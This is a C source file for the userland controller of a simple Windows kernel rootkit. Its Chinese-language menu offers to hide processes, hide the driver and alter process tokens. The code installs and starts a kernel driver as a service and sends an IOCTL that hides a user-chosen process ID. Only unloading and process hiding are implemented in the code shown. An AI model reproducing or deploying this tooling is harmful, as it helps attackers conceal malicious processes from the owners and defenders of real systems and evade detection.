#define _CRT_SECURE_NO_WARNINGS

#include "define.h"
#include "dbgmsg.h"
#include "ntstatus.h"
int setDeviceHandle(LPHANDLE pHandle)
{
	*pHandle = CreateFile
	(
		UserlandPath,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (*pHandle == INVALID_HANDLE_VALUE)
	{
		DBG_PRINT2("[setDeviceHandle]: handle to %s not valid\n", UserlandPath);
		return STATUS_FAILED;
	}
	DBG_TRACE("setDeviceHandle", "device file handle acquired");
	return STATUS_SUCCESS;
}

int hidePID(HANDLE hDeviceFile,DWORD pid)
{
	BOOL opStatus = TRUE;
	DWORD bytesRead = 0;

	opStatus = DeviceIoControl
	(
		hDeviceFile,
		(DWORD)IOCTL_TEST_HIDEME,
		(LPVOID)&pid,
		sizeof(DWORD),
		NULL,
		0,
		&bytesRead,
		NULL
	);
	if (opStatus == FALSE)
	{
		DBG_TRACE("Hide Process", "DeviceIoControl() FAILED");
	}
	return STATUS_SUCCESS;
}

//卸载驱动程序  
BOOL UnLoadSys(LPCTSTR szSvrName)
{
	//一定义所用到的变量
	BOOL bRet = FALSE;
	SC_HANDLE hSCM = NULL;//SCM管理器的句柄,用来存放OpenSCManager的返回值
	SC_HANDLE hService = NULL;//NT驱动程序的服务句柄，用来存放OpenService的返回值
	SERVICE_STATUS SvrSta;
	//二打开SCM管理器
	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCM == NULL)
	{
		//带开SCM管理器失败
		DBG_TRACE("onUnloadSys", "open SCM failed");
		DBG_PRINT2("Last Error:%d\n", GetLastError());
		bRet = FALSE;
		goto BeforeLeave;
	}
	else
	{
		//打开SCM管理器成功
		DBG_TRACE("onUnloadSys", "open SCM success");
	}
	//三打开驱动所对应的服务
	hService = OpenService(hSCM, szSvrName, SERVICE_ALL_ACCESS);

	if (hService == NULL)
	{
		//打开驱动所对应的服务失败 退出
		DBG_TRACE("onUnloadSys", "open service failed");
		DBG_PRINT2("Last Error:%d\n", GetLastError());
		bRet = FALSE;
		goto BeforeLeave;
	}
	else
	{
		DBG_TRACE("onUnloadSys", "open service success"); //打开驱动所对应的服务 成功
	}
	//四停止驱动程序，如果停止失败，只有重新启动才能，再动态加载。  
	if (!ControlService(hService, SERVICE_CONTROL_STOP, &SvrSta))
	{
		DBG_TRACE("onUnloadSys", "stop service failed");
		DBG_PRINT2("Last Error:%d\n", GetLastError());
	}
	else
	{
		//停止驱动程序成功
		DBG_TRACE("onUnloadSys", "stop service success");
	}
	//五动态卸载驱动服务。  
	if (!DeleteService(hService))  //TRUE//FALSE
	{
		//卸载失败
		DBG_TRACE("onUnloadSys", "uninstall driver failed");
		DBG_PRINT2("Last Error:%d\n", GetLastError());
	}
	else
	{
		//卸载成功
		DBG_TRACE("onUnloadSys", "uninstall driver success");

	}
	bRet = TRUE;
	//六 离开前关闭打开的句柄
BeforeLeave:
	if (hService>0)
	{
		CloseServiceHandle(hService);
	}
	if (hSCM>0)
	{
		CloseServiceHandle(hSCM);
	}
	return bRet;
}


SC_HANDLE installDriver(LPCTSTR driverName, LPCTSTR binaryPath)
{
	SC_HANDLE scmDBHandle = NULL;
	SC_HANDLE svcHandle = NULL;

	scmDBHandle = OpenSCManager
	(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
	);
	if (NULL == scmDBHandle)
	{
		DBG_TRACE("installDriver", "coult not open handle to SCM database");
		return NULL;
	}

	svcHandle = CreateService
	(
		scmDBHandle,
		driverName,
		driverName,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		binaryPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (svcHandle == NULL) {
		if (GetLastError() == ERROR_SERVICE_EXISTS) {
			DBG_TRACE("installDriver", "driver already installed");
			svcHandle = OpenService(scmDBHandle, driverName, SERVICE_ALL_ACCESS);
			if (svcHandle == NULL) {
				DBG_TRACE("installDriver", "could not open handle to driver");
				CloseServiceHandle(scmDBHandle);
				return NULL;
			}
			CloseServiceHandle(scmDBHandle);
			return svcHandle;
		}
		DBG_TRACE("installDriver", "could not open handle to driver");
		CloseServiceHandle(scmDBHandle);
		return NULL;
	}

	DBG_TRACE("installDriver", "function returning successful");
	CloseServiceHandle(scmDBHandle);
	return svcHandle;
}

BOOL loadDriver(SC_HANDLE svcHandle)
{
	if (StartService(svcHandle, 0, NULL) == 0) {
		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
			DBG_TRACE("loadDriver", "driver alread running");
			return TRUE;
		}
		else {
			DBG_TRACE("loadDriver", "failed to load driver");
			return FALSE;
		}
	}

	DBG_TRACE("loadDriver", "driver loaded successfully");
	return TRUE;
}

void getPath(LPCSTR path)
{
	GetCurrentDirectory(MAX_PATH, path);
	strncat(path, "\\", MAX_PATH - strlen(path));
	strncat(path, DIRVER_FILE_NAME, MAX_PATH - strlen(path));
}

int main()
{
	LPCSTR binaryPath;
	SC_HANDLE svcHandle;
	binaryPath = (LPCSTR)malloc(MAX_PATH);
	memset(binaryPath, 0, MAX_PATH);
	getPath(binaryPath);

	svcHandle = installDriver(DRIVER_NAME, binaryPath);
	if (svcHandle == NULL) {
		DBG_TRACE("onMain", "could not open SCM");
		return -1;
	}

	if (!loadDriver(svcHandle)) {
		DBG_TRACE("onMain", "could not load driver");
		return -1;
	}
	printf("已成功加载内核层驱动！\n");
	printf("欢迎使用本软件，本软件是简单Rootkit，提供以下功能：\n");

	while (1) {
		int n;
		printf("0. 卸载驱动并退出\n1. 隐藏进程\n2. 隐藏内核驱动\n3. 更改进程Token\n请输入功能号：");
		scanf("%d", &n);
		switch (n) {
		case 0:
		{
			LPCSTR szSvrName = DRIVER_NAME;
			printf("正在卸载驱动……\n");
			if (!UnLoadSys(szSvrName)) {
				return -1;
			}
			printf("驱动已卸载\n");
			printf("正在退出程序……\n");
			CloseServiceHandle(svcHandle);
			free(binaryPath);
			return 0;
		}

		case 1:
		{
			BOOL opStatus = TRUE;
			int retCode = STATUS_SUCCESS;
			HANDLE hDeviceFile = INVALID_HANDLE_VALUE;
			DWORD pid;

			printf("请输入要隐藏的PID：");
			scanf("%d", &pid);
			
			retCode = setDeviceHandle(&hDeviceFile);
			if (retCode != STATUS_SUCCESS) {
				DBG_TRACE("onMain", "could not set device handle");
				return -1;
			}
			retCode = hidePID(hDeviceFile,pid);
			if (retCode != STATUS_SUCCESS) {
				DBG_TRACE("onMain", "could not hide process");
				return -1;
			}
		}
		break;

		default:
		{
			printf("您的输入有误\n");
		}
		}
	}

}